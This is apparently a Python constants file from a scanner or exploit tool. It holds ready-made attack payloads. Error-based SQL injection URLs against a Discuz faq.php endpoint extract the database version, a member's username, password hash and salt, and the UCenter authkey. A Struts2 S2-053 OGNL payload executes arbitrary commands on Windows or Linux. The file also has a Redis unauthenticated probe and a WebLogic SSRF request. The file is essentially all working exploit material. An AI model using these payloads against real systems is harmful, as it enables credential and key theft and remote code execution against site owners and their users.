PAYLOAD_DB_VERSION = "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema%20.tables%20group%20by%20x)a)%23"

PAYLOAD_GET_USER_PWD_SALT = "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%28username,0x3a,password,0x3a,salt%29%20from%20cdb_uc_members%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"

PAYLOAD_GET_KEY1 = "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x3a,(select%20substr(authkey,1,62)%20from%20cdb_uc_applications%20limit%200,1),0x3a)x%20from%20information_schema.tables%20group%20by%20x)a)%23"

PAYLOAD_GET_KEY2 = "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x3a,(select%20substr(authkey,63,64)%20from%20cdb_uc_applications%20limit%200,1),0x3a)x%20from%20information_schema.tables%20group%20by%20x)a)%23"

PAYLOAD_STRUTS2_053_1 = """%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"""

PAYLOAD_STRUTS2_053_2 = """').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n"""

payload_redis_unauth_1 = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'

payload_weblogic_ssrf_1 = ":7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
